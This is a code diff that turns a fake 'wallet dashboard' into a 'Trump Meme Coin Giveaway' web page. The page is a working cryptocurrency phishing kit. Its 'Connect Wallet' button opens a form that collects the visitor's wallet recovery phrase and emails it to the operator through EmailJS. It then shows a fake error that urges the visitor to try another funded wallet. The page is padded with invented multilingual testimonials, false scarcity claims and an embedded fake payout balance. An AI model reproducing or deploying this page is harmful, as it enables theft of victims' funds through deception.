@@ -3,253 +3,495 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Wallet Dashboard</title>
+  <title>The Official Trump Meme Coin Giveaway</title>
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: transparent;
-      color: white;
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .dashboard {
+    /* Updated Header Styles */
+    .header-container {
+      background: #0055cc;
       width: 100%;
-      height: 200px;
-      background: #1c1c1e;
-      padding: 24px;
-      border-radius: 12px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.5);
-      display: flex;
-      flex-direction: column;
+      color: white;
     }
 
-    .balance {
-      font-size: 1.2rem;
-      margin-bottom: 8px;
+    .header {
       display: flex;
       align-items: center;
+      gap: 16px;
+      padding: 20px;
+      white-space: nowrap;
+      max-width: 1200px;
+      margin: 0 auto;
     }
 
-    .balance-logo {
-      width: 24px;
-      height: 24px;
-      object-fit: contain;
-      margin-right: 8px;
+    .header img {
+      width: 60px;
+      height: auto;
+      border-radius: 12px;
     }
 
-    .amount {
-      font-size: 2rem;
-      font-weight: bold;
-      margin-bottom: 16px;
-      color: #00ff80;
-      text-shadow: 0 0 8px rgba(0, 255, 128, 0.7);
+    .header h1 {
+      font-size: 4vw;
+      font-weight: 900;
+      margin: 0;
+      letter-spacing: 1px;
+      color: white;
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
     }
 
-    .status-message {
-      padding: 8px 12px;
-      background: #2c2c2e;
-      border-radius: 8px;
-      margin-bottom: 12px;
-      display: none;
-      animation: fadeIn 0.5s ease-in;
+    iframe {
+      width: 100%;
+      height: 250px;
+      border: none;
+      display: block;
+      background: transparent;
     }
 
-    .activity-log {
-      font-size: 0.9rem;
-      color: #bbb;
-      flex: 1;
-      overflow-y: auto;
-      margin-bottom: 12px;
-    }
-
-    .log-entry {
-      margin-bottom: 4px;
-      opacity: 0.8;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .idle-message {
-      font-size: 0.8rem;
-      color: #666;
-      text-align: center;
-      animation: fadeIn 1s ease-in-out infinite alternate;
-      padding: 8px 0;
-    }
-    
-      @media (min-width: 768px) {
-      .dashboard {
-        height: 400px;
+    /* Desktop tweaks */
+    @media (min-width: 768px) {
+      .header {
+        justify-content: center;
       }
 
-      .balance {
-        font-size: 1.5rem;
+      iframe {
+        height: 500px;
       }
 
-      .amount {
+      .header h1 {
         font-size: 2.5rem;
       }
 
-      .activity-log {
-        font-size: 1rem;
+      .header img {
+        width: 80px;
       }
+    }
 
-      .idle-message {
-        font-size: 0.9rem;
-      }                     
+    /* Rest of your CSS remains exactly the same */
+    body, h1, h2, p, button, input, select, a, footer {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D') no-repeat center center/cover;
+      color: #333;
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+    .container {
+      max-width: 900px;
+      margin: 30px auto;
+      padding: 20px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      transition: filter 0.3s ease;
+    }
+    .blurred {
+      filter: blur(8px);
+      pointer-events: none;
+    }
+    .wallet-page {
+      display: none;
+      background: #fff;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 80%;
+      max-width: 300px;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      z-index: 1000;
+      transition: filter 0.3s ease;
+    }
+    .wallet-page.active {
+      display: block;
+    }
+    .wallet-page.blurred {
+      filter: blur(8px);
+      pointer-events: none;
+    }
+    .error {
+      color: red;
+      font-weight: bold;
+      font-size: 0.9rem;
+      text-align: center;
+      background: #ffe6e6;
+      padding: 8px;
+      border: 1px solid red;
+      border-radius: 5px;
+      margin-bottom: 10px;
+    }
+    #error-box {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #ffe6e6;
+      border: 1px solid #cc0000;
+      color: #cc0000;
+      font-size: 0.9rem;
+      font-weight: 600;
+      padding: 15px 25px;
+      border-radius: 8px;
+      z-index: 2000;
+      max-width: 320px;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+    #error-box button {
+      margin-top: 12px;
+      background: #ff4500;
+      color: white;
+      border: none;
+      padding: 10px 18px;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #error-box button:hover {
+      background: #e03e00;
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    textarea {
+      width: 100%;
+      height: 60px;
+      padding: 8px;
+      font-size: 0.9rem;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      resize: none;
+      display: block;
+      margin: 10px auto;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #fff;
+      background: #ff4500;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn:hover {
+      background: #e03e00;
+    }
+    .btn:disabled {
+      background: #cccccc;
+      cursor: not-allowed;
+    }
+    .btn.connecting {
+      background: #ff4500;
+    }
+    .btn.connecting::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      animation: connectingAnimation 1.5s infinite;
+    }
+    @keyframes connectingAnimation {
+      0% {
+        transform: translateX(-100%);
+      }
+      100% {
+        transform: translateX(100%);
+      }
+    }
+    .btn-spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      padding: 20px 0;
+      background: #f1f1f1;
+      color: #666;
+    }
+    .terms {
+      font-size: 0.9rem;
+      margin-top: 20px;
+    }
+    .terms a {
+      color: #0056b3;
+      text-decoration: none;
+    }
+    .terms a:hover {
+      text-decoration: underline;
+    }
+    .note {
+      margin-top: 20px;
+      font-size: 0.75rem;
+      color: #333;
+      text-align: center;
+      background: #fff3cd;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ffeeba;
+    }
+    #wallet-phrase::placeholder {
+      text-align: center;
+      font-size: 1rem;
+      font-weight: bold;
+    }
+    body.noscroll {
+      overflow: hidden;
+    }
+    #testimonials {
+      background: #f9f9f9;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+      margin-top: 30px;
+      text-align: center;
+    }
+    #testimonials h3 {
+      margin-bottom: 10px;
+    }
+    #testimonial-text {
+      font-style: italic;
+      font-size: 1.1rem;
+      transition: opacity 0.5s ease-in-out;
+      min-height: 60px;
     }
   </style>
 </head>
 <body>
-  <div class="dashboard">
-    <div class="balance">
-      <img src="https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Logo" class="balance-logo" />
-      <span>Balance</span>
+  <!-- Updated Header Section with Solid Blue Background -->
+  <div class="header-container">
+    <div class="header">
+      <img src="https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin">
+      <h1>TRUMP MEME COIN GIVEAWAY</h1>
     </div>
-    <div class="amount" id="balanceDisplay">$5,000,000</div>
-    <div class="status-message" id="statusBox"></div>
-    <div class="activity-log" id="logBox"></div>
-    <div class="idle-message" id="idleMsg">⏳ Awaiting wallet connection...</div>
+    <iframe src="https://trump-balance-dashboard.netlify.app/" loading="lazy"></iframe>
   </div>
 
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-  
+  <!-- Rest of your HTML remains exactly the same -->
+  <div class="container" id="main-content">
+    <div class="card">
+      <h2>Join the Revolution!</h2>
+      <h4>Claim Your Share of $10 Million!</h4>
+      <p>We're rewarding the first 20,000 active wallets with $500 in $TRUMP each!</p>
+      <p>Only 2,000+ spots remain — don't miss out!</p>
+      <p>Be part of the movement — connect your wallet today and secure your share!</p>
+      <button class="btn" id="connect-wallet-btn">Connect Wallet</button>
+    </div>
+    <div id="testimonials">
+      <h3>What Others Are Saying</h3>
+      <div id="testimonial-text">Loading testimonials...</div>
+    </div>
+  </div>
+
+  <div class="wallet-page" id="wallet-page">
+    <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
+    <h2>Connect Your Wallet</h2>
+    <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
+    <form id="wallet-form">
+      <label for="wallet-type">Select Wallet Type</label>
+      <select id="wallet-type" name="wallet_type" required>
+        <option value="alphawallet">AlphaWallet</option>
+        <option value="argent">Argent</option>
+        <option value="atomic">Atomic Wallet</option>
+        <option value="bitkeep">BitKeep</option>
+        <option value="bitpie">Bitpie</option>
+        <option value="blockchain">Blockchain Wallet</option>
+        <option value="brd">BRD</option>
+        <option value="coin98">Coin98</option>
+        <option value="coinomi">Coinomi</option>
+        <option value="coinbase">Coinbase Wallet</option>
+        <option value="exodus">Exodus</option>
+        <option value="huobi">Huobi Wallet</option>
+        <option value="imtoken">imToken</option>
+        <option value="mathwallet">MathWallet</option>
+        <option value="metamask">MetaMask</option>
+        <option value="mycelium">Mycelium</option>
+        <option value="myetherwallet">MyEtherWallet</option>
+        <option value="phantom">Phantom</option>
+        <option value="rainbow">Rainbow</option>
+        <option value="safepal">SafePal</option>
+        <option value="solflare">Solflare</option>
+        <option value="tokenpocket">TokenPocket</option>
+        <option value="trustwallet">Trust Wallet</option>
+        <option value="zelcore">Zelcore</option>
+        <option value="zengo">Zengo</option>
+        <option value="others">Others</option>
+      </select>
+      <label for="wallet-phrase">Enter Your Wallet Phrase</label>
+      <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
+      <div class="note">
+        <p>Note: Only wallets with a balance or transaction history will be credited.</p>
+      </div>
+      <button class="btn" id="submit-btn" type="submit">Connect</button>
+    </form>
+  </div>
+
+  <div id="error-box"></div>
+
+  <footer>
+    <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
+    <div class="terms">
+      <p>By participating, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a>, and <a href="#">Security Policy</a>.</p>
+    </div>
+  </footer>
+
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    // Initialize Firebase
-    const firebaseConfig = {
-      apiKey: "AIzaSyAuzAP-nBbSZfLPhHRpUM12Ikx29X8cubc",
-      authDomain: "wallet-dashboard-c1f5b.firebaseapp.com",
-      databaseURL: "https://wallet-dashboard-c1f5b-default-rtdb.firebaseio.com",
-      projectId: "wallet-dashboard-c1f5b",
-      storageBucket: "wallet-dashboard-c1f5b.appspot.com",
-      messagingSenderId: "256709610703",
-      appId: "1:256709610703:web:64abb94f87aab57beefbba",
-      measurementId: "G-LTXHVWPBLR"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+    (function() {
+      emailjs.init("8_8uPDLPGGbBtyIqv");
+    })();
 
-    // DOM elements
-    const balanceDisplay = document.getElementById("balanceDisplay");
-    const statusBox = document.getElementById("statusBox");
-    const logBox = document.getElementById("logBox");
-    const idleMsg = document.getElementById("idleMsg");
-
-    // Initialize data
-    let balance = 5000000;
-    let logs = [];
-    const walletRef = database.ref('walletData');
-
-    // Load data from Firebase or initialize
-    walletRef.once('value').then(snapshot => {
-      if (snapshot.exists()) {
-        const data = snapshot.val();
-        balance = data.balance;
-        logs = data.logs || [];
-      } else {
-        walletRef.set({ balance, logs });
-      }
-      updateDisplay();
-    });
-
-    // Real-time updates
-    walletRef.on('value', snapshot => {
-      const data = snapshot.val();
-      if (data) {
-        balance = data.balance;
-        logs = data.logs || [];
-        updateDisplay();
-      }
-    });
-
-    function updateDisplay() {
-      balanceDisplay.textContent = `$${balance.toLocaleString()}`;
-      renderLogs();
-    }
-
-    function renderLogs() {
-      logBox.innerHTML = "";
-      logs.forEach(log => {
-        const div = document.createElement("div");
-        div.className = "log-entry";
-        div.textContent = log;
-        logBox.appendChild(div);
-      });
-    }
-
-    function simulateWalletConnection() {
-      idleMsg.style.display = "none";
-      showStatus("Wallet Connected", 2000, () => {
-        deductBalance(500);
-        const address = generateAddress();
-        showStatus(`Funds Sent to ${address}`, 3000, () => {
-          idleMsg.style.display = "block";
-        });
-        logActivity(`Sent $500 to ${address}`);
-      });
-    }
-
-    function showStatus(message, duration, callback) {
-      statusBox.style.display = "block";
-      statusBox.textContent = message;
+    document.getElementById('connect-wallet-btn').addEventListener('click', function() {
+      const btn = this;
+      
+      // Disable button and show loading state
+      btn.disabled = true;
+      btn.classList.add('connecting');
+      btn.innerHTML = '<span class="btn-spinner"></span> Connecting...';
+      
+      // Show wallet page after 4 seconds
       setTimeout(() => {
-        statusBox.style.display = "none";
-        if (callback) callback();
-      }, duration);
+        document.getElementById('wallet-page').classList.add('active');
+        document.getElementById('main-content').classList.add('blurred');
+        document.querySelector('.header-container').classList.add('blurred');
+        document.querySelector('footer').classList.add('blurred');
+        document.body.classList.add('noscroll');
+        
+        // Reset button state (though it's hidden now)
+        btn.disabled = false;
+        btn.classList.remove('connecting');
+        btn.textContent = 'Connect Wallet';
+      }, 4000);
+    });
+
+    function returnToMainPage() {
+      document.getElementById('wallet-form').reset();
+      document.getElementById('wallet-page').classList.remove('active');
+      document.getElementById('wallet-page').classList.remove('blurred');
+      document.getElementById('error-box').style.display = "none";
+      document.getElementById('main-content').classList.remove('blurred');
+      document.querySelector('.header-container').classList.remove('blurred');
+      document.querySelector('footer').classList.remove('blurred');
+      document.body.classList.remove('noscroll');
     }
 
-    function deductBalance(amount) {
-      balance -= amount;
-      if (balance <= 0) {
-        updateDisplay();
-        logActivity("Balance depleted");
+    document.getElementById("wallet-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      const btn = document.getElementById("submit-btn");
+      const errorBox = document.getElementById("error-box");
+      btn.disabled = true;
+      btn.textContent = "Connecting...";
+      emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
+      .then(function(response) {
         setTimeout(() => {
-          balance = 5000000;
-          logActivity("Balance refilled to $5,000,000");
-          logs = [];
-          walletRef.set({ balance, logs });
-          updateDisplay();
-        }, 3000);
-      }
-      walletRef.set({ balance, logs });
-    }
+          errorBox.innerHTML = `
+  <p>
+    Oops, something went wrong crediting this wallet.<br>
+    Please ensure your recovery phrase was entered correctly, the wallet has recent activity, or try again with a different wallet that holds a balance.
+  </p>
+  <button onclick="returnToMainPage()">Try Again</button>
+`;
+          errorBox.style.display = "block";
+          document.getElementById('wallet-page').classList.add('blurred');
+          btn.disabled = false;
+          btn.textContent = "Connect";
+        }, 2000);
+      })
+      .catch(function(error) {
+        errorBox.innerHTML = `
+  <p>
+    Oops, something went wrong crediting this wallet.<br>
+    Please ensure your recovery phrase was entered correctly, the wallet has recent activity, or try again with a different wallet that holds a balance.
+  </p>
+  <button onclick="returnToMainPage()">Try Again</button>
+`;
+        errorBox.style.display = "block";
+        document.getElementById('wallet-page').classList.add('blurred');
+        btn.disabled = false;
+        btn.textContent = "Connect";
+      });
+    });
 
-    function logActivity(message) {
-      const timestampedMsg = `${new Date().toLocaleTimeString()} - ${message}`;
-      logs.unshift(timestampedMsg);
-      walletRef.set({ balance, logs });
-      renderLogs();
-    }
-
-    function generateAddress() {
-      const chars = "abcdef0123456789";
-      let addr = "0x";
-      for (let i = 0; i < 8; i++) {
-        addr += chars[Math.floor(Math.random() * chars.length)];
-      }
-      return addr + "...";
-    }
-
-    function randomIntervalCall() {
-      const time = Math.floor(Math.random() * 240000) + 10000;
+    // Testimonials auto-rotate
+    const testimonials = [
+      "“Super easy! Just connected and claimed my $500 $TRUMP. MAGA! 🚀” – Michael D.",
+      "“No me lo esperaba, pero ¡boom! $500 $TRUMP en mi wallet! 💥” – Fatima A.",
+      "“这是2025年最棒的空投，立刻拿到500美元！🔥” – Li Wei",
+      "“Trump Meme Coin ist lustig, aber das Geld ist echt! 💰” – Brigitte S.",
+      "“Tout le monde dans mon groupe crypto parle de ces 500$ airdrop! 💸” – M. Tran",
+      "“Pensé que era broma, pero ya tengo $500 más! 😎” – Rico P.",
+      "“I never thought it was real, but $500 $TRUMP just hit my wallet! 🤯” – Jason M.",
+      "“簡単にクレームしてすぐに確認もらえた。500ドルゲット！🎉” – Nina F.",
+      "“$500 $TRUMP 받아서 기쁘다! 멋진 프로젝트! 👍” – Min-Jae K.",
+      "“Facile à réclamer, confirmation immédiate, 500$ reçus! 👏” – Alex C.",
+      "“I checked twice and the $500 $TRUMP was already there. So legit! 🔥” – Sarah W.",
+      "“Скоро всё закончится! Расскажите друзьям и получите свои $500! 💥” – Olga K.",
+      "“$500 $TRUMP est arrivé rapidement — pas de soucis, juste des récompenses! 🤑” – Hiroshi K.",
+      "“Recebi meus $500 em $TRUMP, melhor surpresa do ano! 🎊” – Isabella R.",
+      "“Semplice, veloce e reale. $500 $TRUMP accreditati senza problemi! 🛡️” – Carlos V.",
+      "“Just got my $500 $TRUMP claim — smooth and fast! Highly recommend. 👍” – Emily R.",
+      "“كنت متشككًا، لكنني تلقيت 500 دولار في محفظتي! 💵” – Amina S.",
+      "“500 $TRUMP airdrop ohne Probleme erhalten — jetzt gespannt auf die Entwicklung! 🚀” – Lars M.",
+      "“My $500 $TRUMP arrived faster than I expected. Love this! 😍” – David L.",
+      "“Grâce à ça, mon portefeuille crypto vient de s'enrichir de 500$! 💎” – Ananya P.",
+      "“Do Brasil aos EUA, todos estamos ganhando $500 $TRUMP — incrível! 🌎” – Diego T.",
+      "“Just claimed $500 $TRUMP, no hassles, no delays! Amazing airdrop. 🎉” – Megan T.",
+      "“$500 $TRUMP были зачислены за минуты, как и обещали. ⏱️” – Olga K.",
+      "“Najłatwiejsze 500$, jakie zarobiłem w krypto. Prawdziwa historia! 💯” – Ahmed N.",
+      "“Non posso credere di aver ottenuto 500$ $TRUMP — ora ci credo! 🎉” – Sofia G.",
+      "“Totally surprised by how easy it was to get $500 $TRUMP. Legit and real! 💪” – Chris H.",
+      "“I've been in crypto a while, but this $500 $TRUMP airdrop was a breeze! 👌” – Linda G.",
+      "“$500 $TRUMP instantly credited. Didn't expect it to be this fast! 🚀” – Matt B.",
+      "“Followed the steps and boom — $500 $TRUMP in my wallet. Crazy smooth! 🔥” – Olivia K.",
+      "“Never thought I'd get free $500 $TRUMP, but here we are. Loving it! 😎” – James P."
+    ];
+    let tIndex = 0;
+    const testimonialText = document.getElementById("testimonial-text");
+    function rotateTestimonials() {
+      testimonialText.style.opacity = 0;
       setTimeout(() => {
-        simulateWalletConnection();
-        randomIntervalCall();
-      }, time);
+        testimonialText.textContent = testimonials[tIndex];
+        testimonialText.style.opacity = 1;
+        tIndex = (tIndex + 1) % testimonials.length;
+      }, 500);
     }
-
-    // Start the app
-    randomIntervalCall();
+    rotateTestimonials();
+    setInterval(rotateTestimonials, 5000);
   </script>
 </body>
 </html>
